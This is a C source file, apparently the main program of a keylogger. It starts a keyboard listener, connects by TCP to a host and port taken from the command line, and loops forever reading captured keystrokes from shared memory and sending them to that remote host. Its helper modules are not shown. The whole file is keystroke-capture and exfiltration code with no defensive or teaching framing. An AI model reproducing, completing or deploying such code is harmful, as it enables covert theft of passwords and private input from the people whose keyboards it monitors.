#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#include "settings/constants.h"
#include "keyboard/listener.h"
#include "memory/memory.h"
#include "tcp/client.h"

static logger_t logger;
static tcp_client_t tcpclient;

void init_memory() {
    memory_init();
}

void init_keyboard_listener() {
    keyboard_listener_create();
}

void init_logger() {
    logger_create(&logger, "app", CONSTANT_LOG_LEVEL);
}

void init_tcpclient() {
    tcpclient_create(&tcpclient);
}

void init() {
    init_memory();
    init_keyboard_listener();
    init_logger();
    init_tcpclient();
}

int main(int argc , char *argv[]) {
    char read_buffer[257];
    unsigned int read_bytes;
    char *host = argv[1];
    unsigned short port = atoi(argv[2]);

    init();

    if (KEYBOARD_LISTENER_E_SUCCESSFUL != keyboard_listener_start()) {
        logger_error(logger, "Could not start keyboard listener");
        return -1;
    }

    if (TCPCLIENT_E_SUCCESSFUL != tcpclient_open(tcpclient, host, port)) {
        logger_error(logger, "Failed to open connection to tcp server");
        return -1;
    }

    while(TRUE) {
        if (KEYBOARD_LISTENER_E_SUCCESSFUL != keyboard_listener_read(read_buffer, &read_bytes)) {
            logger_warn(logger, "Failed to read from shared memory..");
            continue;
        }

        if (read_bytes > 0) {
            //printf("%s", read_buffer);
            tcpclient_send(tcpclient, read_buffer, read_bytes);
        }

        usleep(100000);
    }

    return 0;
}
